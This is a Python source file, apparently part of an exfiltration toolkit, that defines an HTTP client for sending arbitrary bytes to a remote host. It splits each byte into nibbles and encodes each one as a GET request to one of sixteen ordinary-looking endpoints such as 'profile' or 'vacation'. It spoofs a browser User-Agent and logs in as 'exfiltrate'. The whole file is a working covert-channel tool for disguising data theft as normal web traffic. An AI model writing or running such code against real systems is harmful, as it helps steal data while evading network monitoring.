from __future__ import annotations

import requests

from Clients.Client import Client

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
}

class HttpClient(Client):
    def __init__(self, target_ip: str, target_port: int):
        super().__init__(target_ip, target_port)

    def send(self, data: bytes):
        endpoint_base = f"http://{self.ip}:{self.port}/users"
        response = requests.post(f"{endpoint_base}/login", json={"username": "exfiltrate", "password": "data"}, headers=HEADERS)
        print(response.json())
        for byte in data:
            upper, lower = self.__split_byte(byte)
            endpoint_node = self.__get_byte_endpoint(lower)
            response = requests.get(f"{endpoint_base}/{endpoint_node}", headers=HEADERS)
            print(response.json())
            endpoint_node = self.__get_byte_endpoint(upper)
            response = requests.get(f"{endpoint_base}/{endpoint_node}", headers=HEADERS)
            print(response.json())
        response = requests.post(f"{endpoint_base}/logout", headers=HEADERS)
        print(response.json())

    @staticmethod
    def __split_byte(byte: int) -> tuple[int, int]:
        return (byte & 0xF0) >> 4, byte & 0x0F

    @staticmethod
    def __get_byte_endpoint(byte: int) -> str:
        match byte:
            case 0x00:
                return "info"
            case 0x01:
                return "stats"
            case 0x02:
                return "home"
            case 0x03:
                return "story"
            case 0x04:
                return "privileges"
            case 0x05:
                return "profile"
            case 0x06:
                return "details"
            case 0x07:
                return "department"
            case 0x08:
                return "schedule"
            case 0x09:
                return "vacation"
            case 0x0A:
                return "group"
            case 0x0B:
                return "information"
            case 0x0C:
                return "status"
            case 0x0D:
                return "data"
            case 0x0E:
                return "reports"
            case 0x0F:
                return "messages"


if __name__ == "__main__":
    pass
